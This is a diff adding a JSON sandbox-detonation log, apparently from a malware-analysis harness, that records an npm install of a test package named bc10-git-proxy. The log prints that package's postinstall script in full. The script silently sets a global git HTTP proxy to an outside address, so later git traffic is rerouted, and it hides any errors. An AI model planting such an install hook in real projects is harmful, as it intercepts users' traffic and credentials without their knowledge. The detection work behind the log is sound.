@@ -1,0 +1,111 @@
+{
+ "job_id": "95b1a7c4-4d96-414e-9085-bac8bdae59a0",
+ "status": "completed",
+ "exit_code": 0,
+ "duration_s": 2.95,
+ "exec_events": [
+  {
+   "ts": "2026-11-03T22:31:05.474256354Z",
+   "pid": 287604,
+   "ppid": 287581,
+   "binary": "/usr/local/bin/docker-entrypoint.sh",
+   "args": "/usr/local/bin/docker-entrypoint.sh /bin/sh -c \"/bin/true pre-c14dc630f21638f8; \"$@\"; rc=$?; /bin/true post-c14dc630f21638f8; exit $rc\" detonator-witness npm install --no-audit --no-fund --prefix payloads/bc10-git-proxy",
+   "parent_binary": "/usr/bin/containerd-shim-runc-v2",
+   "uid": 10001,
+   "cwd": "/work"
+  },
+  {
+   "ts": "2026-11-03T22:31:05.479486459Z",
+   "pid": 287645,
+   "ppid": 287604,
+   "binary": "/usr/local/bin/npm",
+   "args": "node /usr/local/bin/npm install --no-audit --no-fund --prefix payloads/bc10-git-proxy",
+   "parent_binary": "/bin/sh",
+   "uid": 10001,
+   "cwd": "/work"
+  },
+  {
+   "ts": "2026-11-03T22:31:05.480162946Z",
+   "pid": 287645,
+   "ppid": 287645,
+   "binary": "/usr/local/bin/node",
+   "args": "/usr/local/bin/npm install --no-audit --no-fund --prefix payloads/bc10-git-proxy",
+   "parent_binary": "/usr/local/bin/npm",
+   "uid": 10001,
+   "cwd": "/work"
+  },
+  {
+   "ts": "2026-11-03T22:31:05.927243338Z",
+   "pid": 287664,
+   "ppid": 287645,
+   "binary": "/usr/bin/sh",
+   "args": "-c \"node scripts/setup.js\"",
+   "parent_binary": "/usr/local/bin/node",
+   "uid": 10001,
+   "cwd": "/work/payloads/bc10-git-proxy"
+  },
+  {
+   "ts": "2026-11-03T22:31:05.928508549Z",
+   "pid": 287665,
+   "ppid": 287664,
+   "binary": "/usr/local/bin/node",
+   "args": "scripts/setup.js",
+   "parent_binary": "/usr/bin/sh",
+   "uid": 10001,
+   "cwd": "/work/payloads/bc10-git-proxy"
+  },
+  {
+   "ts": "2026-11-03T22:31:05.964495945Z",
+   "pid": 287672,
+   "ppid": 287665,
+   "binary": "/bin/sh",
+   "args": "-c \"git config --global http.proxy http://192.0.2.70:8080\"",
+   "parent_binary": "/usr/local/bin/node",
+   "uid": 10001,
+   "cwd": "/work/payloads/bc10-git-proxy"
+  },
+  {
+   "ts": "2026-11-03T22:31:05.965500480Z",
+   "pid": 287673,
+   "ppid": 287672,
+   "binary": "/usr/bin/git",
+   "args": "config --global http.proxy http://192.0.2.70:8080",
+   "parent_binary": "/bin/sh",
+   "uid": 10001,
+   "cwd": "/work/payloads/bc10-git-proxy"
+  }
+ ],
+ "connect_events": [],
+ "dns_queries": [],
+ "file_events": [
+  {
+   "ts": "2026-11-03T22:31:05.588748953Z",
+   "pid": 287645,
+   "binary": "/usr/local/bin/node",
+   "path": "/home/runner/.npmrc"
+  }
+ ],
+ "executed_scripts": [
+  {
+   "path": "/work/payloads/bc10-git-proxy/scripts/setup.js",
+   "package": null,
+   "sha256": "ec0608cc0c3f4f4bfa96ba5b83f0b1b0ca4f05a6727ab80136bade2b6fc76dec",
+   "content": "const { execSync } = require(\"child_process\");\n// Indirection through a trusted tool: future `git` HTTP traffic is quietly re-routed.\ntry {\n  execSync(\"git config --global http.proxy http://192.0.2.70:8080\", { timeout: 3000 });\n} catch {}\n",
+   "truncated": false
+  }
+ ],
+ "decoys": {},
+ "stdout_tail": "\n> bc10@1.0.0 postinstall\n> node scripts/setup.js\n\n\nup to date in 403ms\n",
+ "stderr_tail": "",
+ "truncated": false,
+ "error": null,
+ "sensor": {
+  "pre_seen": true,
+  "post_seen": true
+ },
+ "resources": {
+  "cpu_s": 0.05,
+  "peak_memory_mb": 4.8,
+  "samples": 1
+ }
+}
